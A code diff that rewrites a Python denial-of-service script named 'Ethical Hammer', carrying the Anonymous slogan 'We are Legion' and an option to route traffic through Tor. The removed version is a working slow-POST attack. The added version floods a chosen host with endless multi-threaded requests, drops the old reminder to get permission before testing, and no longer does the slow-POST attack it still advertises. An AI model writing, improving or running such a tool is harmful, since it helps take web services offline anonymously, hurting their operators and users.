@@ -1,130 +1,53 @@
-#!/usr/bin/python
+import argparse
+import requests
+import threading
 import time
-import sys
 import random
-import getopt
-import socks
-import string
-from threading import Thread
 
-class EthicalHammer(Thread):
-    def __init__(self, host, port, tor):
-        super(EthicalHammer, self).__init__()
-        self.host = host
-        self.port = port
-        self.socks = socks.socksocket()
-        self.tor = tor
-        self.running = True
+useragents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+    # Add more user agents as needed
+]
 
-    def _send_http_post(self):
-        global stop_now
-
-        headers = (
-            "POST / HTTP/1.1\r\n"
-            "Host: %s\r\n"
-            "User-Agent: %s\r\n"
-            "Connection: keep-alive\r\n"
-            "Keep-Alive: 900\r\n"
-            "Content-Length: 10000\r\n"
-            "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
-            (self.host, random.choice(useragents))
-        )
-
+def attack(target, port, threads, use_tor):
+    url = f"http://{target}:{port}/"
+    
+    def make_request():
+        headers = {'User-Agent': random.choice(useragents)}
         try:
-            self.socks.send(headers)
-            for _ in range(9999):
-                if stop_now:
-                    self.running = False
-                    break
-                payload = random.choice(string.ascii_letters + string.digits)
-                print(f"Posting: {payload}")
-                self.socks.send(payload)
-                time.sleep(random.uniform(0.1, 3))
+            response = requests.get(url, headers=headers, timeout=5)
+            print(f"Connected to host... Status Code: {response.status_code}")
         except Exception as e:
-            print("Error during POST:", e)
+            print(f"Error: {str(e)}")
 
-    def run(self):
-        while self.running:
-            try:
-                if self.tor:
-                    self.socks.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
-                    time.sleep(1)
-                self.socks.connect((self.host, self.port))
-                print("Connected to host...")
-                self._send_http_post()
-            except Exception as e:
-                print("Error:", e)
-                time.sleep(1)
-                sys.exit()
+    while True:
+        for _ in range(threads):
+            thread = threading.Thread(target=make_request)
+            thread.start()
 
-def usage():
-    print("\n/*")
-    print(" * Ethical Hammer ")
+        # Sleep for 20 seconds without Tor or 40 seconds with Tor before checking the site
+        sleep_time = 20 if not use_tor else 40
+        time.sleep(sleep_time)
+
+def main():
+    parser = argparse.ArgumentParser(description="Ethical Hammer - Slow POST DoS Testing Tool")
+    parser.add_argument("-t", "--target", required=True, help="Hostname or IP of the target")
+    parser.add_argument("-r", "--threads", type=int, default=256, help="Number of threads (default: 256)")
+    parser.add_argument("-p", "--port", type=int, default=80, help="Web server port (default: 80)")
+    parser.add_argument("-T", "--tor", action="store_true", help="Enable anonymizing through Tor on 127.0.0.1:9150")
+    args = parser.parse_args()
+
+    print("\n * Ethical Hammer")
     print(" * Slow POST DoS Testing Tool")
     print(" * entropy [at] phiral.net")
     print(" * Anon-ymized via Tor")
-    print(" * We are Legion.")
-    print(" */\n")
-    print("Usage: ./ethical_hammer.py -t <target> [-r <threads> -p <port> -T -h]")
-    print(" -t|--target <Hostname|IP>")
-    print(" -r|--threads <Number of threads> Defaults to 256")
-    print(" -p|--port <Web Server Port> Defaults to 80")
-    print(" -T|--tor Enable anonymizing through Tor on 127.0.0.1:9150")
-    print(" -h|--help Shows this help\n")
-    print("E.g., ./ethical_hammer.py -t 192.168.1.100 -r 256\n")
-    print("Important: Obtain explicit permission before conducting tests. Use responsibly and legally.")
+    print(" * We are Legion.\n")
 
-def main(argv):
-    try:
-        opts, _ = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
-    except getopt.GetoptError:
-        usage()
-        sys.exit(-1)
+    print(f"Target: {args.target} Port: {args.port}")
+    print(f"Threads: {args.threads} Tor: {args.tor}")
+    print("Give 20 seconds without Tor or 40 with before checking the site")
 
-    global stop_now
-
-    target = ''
-    threads = 256
-    tor = False
-    port = 80
-
-    for opt, arg in opts:
-        if opt in ("-h", "--help"):
-            usage()
-            sys.exit(0)
-        if opt in ("-T", "--tor"):
-            tor = True
-        elif opt in ("-t", "--target"):
-            target = arg
-        elif opt in ("-r", "--threads"):
-            threads = int(arg)
-        elif opt in ("-p", "--port"):
-            port = int(arg)
-
-    if not target or threads <= 0:
-        usage()
-        sys.exit(-1)
-
-    print("/*")
-    print(f" * Target: {target} Port: {port}")
-    print(f" * Threads: {threads} Tor: {tor}")
-    print(" * Give 20 seconds without Tor or 40 with before checking the site")
-    print(" */")
-
-    thread_list = []
-    for _ in range(threads):
-        t = EthicalHammer(target, port, tor)
-        thread_list.append(t)
-        t.start()
-
-    while thread_list:
-        try:
-            thread_list = [t.join(1) for t in thread_list if t is not None and t.is_alive()]
-        except KeyboardInterrupt:
-            print("\nShutting down threads...\n")
-            for t in thread_list:
-                stop_now = True
-                t.running = False
+    attack(args.target, args.port, args.threads, args.tor)
 
 if __name__ == "__main__":
-    main(sys.argv[1:])
+    main()
